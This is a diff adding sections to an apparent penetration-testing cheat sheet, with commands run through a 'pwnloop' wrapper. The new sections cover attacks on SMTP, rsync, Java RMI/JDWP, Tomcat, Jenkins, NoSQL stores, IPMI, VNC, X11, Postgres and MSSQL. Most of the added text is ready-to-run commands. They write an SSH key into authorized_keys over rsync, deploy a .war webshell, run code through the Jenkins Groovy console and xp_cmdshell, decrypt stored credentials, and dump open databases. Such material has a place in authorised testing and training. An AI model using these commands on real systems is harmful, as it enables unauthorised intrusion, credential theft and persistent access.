@@ -162,11 +162,79 @@ primitive if some agent fetches it. Publish a URL pointing at your listener and
 watch — if nothing calls back, the topics are publish-only telemetry and writing
 to them buys you nothing.
 
+## SMTP / IMAP / POP3 (25/587/143/110/993/995)
+
+```bash
+pwnloop x "nc -nv $T 25"                                   # banner, then VRFY/EXPN
+pwnloop x "smtp-user-enum -M VRFY -U users.txt -t $T"      # user enumeration
+pwnloop x "swaks --to a@$T --from b@x --server $T --body 'test'"  # open relay / phishing
+```
+Internal SMTP that accepts mail is a phishing/second-order-XSS vector when a
+human or bot reads it. Read any mailbox you get creds for — passwords land in
+inboxes.
+
+## rsync (873)
+
+```bash
+pwnloop x "rsync --list-only rsync://$T/"                  # list modules
+pwnloop x "rsync -av rsync://$T/<module>/ loot/rsync/"     # pull, often anon
+pwnloop x "rsync -av loot/key.pub rsync://$T/<module>/home/user/.ssh/authorized_keys"
+```
+A writable module mapped into a home directory = SSH key write.
+
+## Java surfaces — RMI / JMX / JDWP (1099/1090/9010/8000/…)
+
+- **RMI/JMX** (`1099`, `9010`) → `nmap --script rmi-dumpregistry`, then
+  `beanshooter`/mjet to load an MBean → RCE.
+- **JDWP** (`8000` and friends, banner `JDWP-Handshake`) → remote debugger =
+  direct RCE: `jdwp-shellifier.py -t $T -p 8000 --cmd 'id'`.
+
+## App servers — Tomcat / Jenkins / JBoss / WebLogic
+
+- **Tomcat manager** (`/manager/html`, `/host-manager`) → default creds
+  (`tomcat:tomcat`, `admin:admin`), then deploy a `.war` webshell:
+  `nxc … ` or `curl -u user:pass -T shell.war "http://$T:8080/manager/text/deploy?path=/s"`.
+- **Jenkins** → `/script` Groovy console = RCE (`"id".execute().text`); unauth
+  build config or `@ASYNC` on old versions; read `/credentials.xml` +
+  `master.key`+`hudson.util.Secret` to decrypt stored creds.
+- **JBoss/WildFly** → JMX console / `jexboss`. **WebLogic** → T3 and CVE
+  deserialization (`10.3`/`12.x`).
+
+## Elasticsearch / Kibana / MongoDB / Memcached / CouchDB
+
+```bash
+pwnloop x "curl -s http://$T:9200/_cat/indices"           # ES, often unauth → dump docs
+pwnloop x "curl -s http://$T:5601/api/status"             # Kibana version → CVE
+pwnloop x "mongosh --host $T --eval 'db.adminCommand({listDatabases:1})'"  # unauth Mongo
+pwnloop x "memcstat --servers=$T; echo 'stats items' | nc -q1 $T 11211"    # Memcached
+pwnloop x "curl -s http://$T:5984/_all_dbs"               # CouchDB; CVE-2017-12635 admin add
+```
+NoSQL stores are frequently left open with no auth — dump everything and grep for
+credentials and tokens.
+
+## Monitoring / infra — Zabbix, IPMI, VNC, X11
+
+- **Zabbix** (`10051`/web) → agent `system.run` RCE, or web default creds
+  `Admin:zabbix`.
+- **IPMI** (`623/udp`) → `nmap --script ipmi-cipher-zero`;
+  dump the RAKP hash and crack (`ipmitool`/`msf ipmi_dumphashes`).
+- **VNC** (`5900`) → `nmap --script realvnc-auth-bypass`; captured `.vnc`
+  passwords decrypt with `vncpwd`.
+- **X11** (`6000`) → `xwd`/`xdotool` over an open display to screenshot/keylog.
+
+## PostgreSQL / MSSQL RCE (beyond the creds check in the DB section)
+
+- **Postgres** superuser → `COPY … FROM PROGRAM 'id'` (9.3+), or the
+  `dblink`/large-object routes. `nxc pgsql $T -u postgres -p pass -x id`.
+- **MSSQL** `sa` → `xp_cmdshell` (enable via `sp_configure`), or `xp_dirtree`
+  coercion (see the MSSQL section above).
+
 ## Anything unusual
 
 Netcat the port and read the banner before assuming. Custom services on high
 ports are frequently the intended path and are usually a buffer overflow or a
-trivially injectable command handler.
+trivially injectable command handler. For crash-triage and exploitation of a
+custom binary service, see `references/binary.md`.
 
 ```bash
 pwnloop x "nc -nv $T <port>"
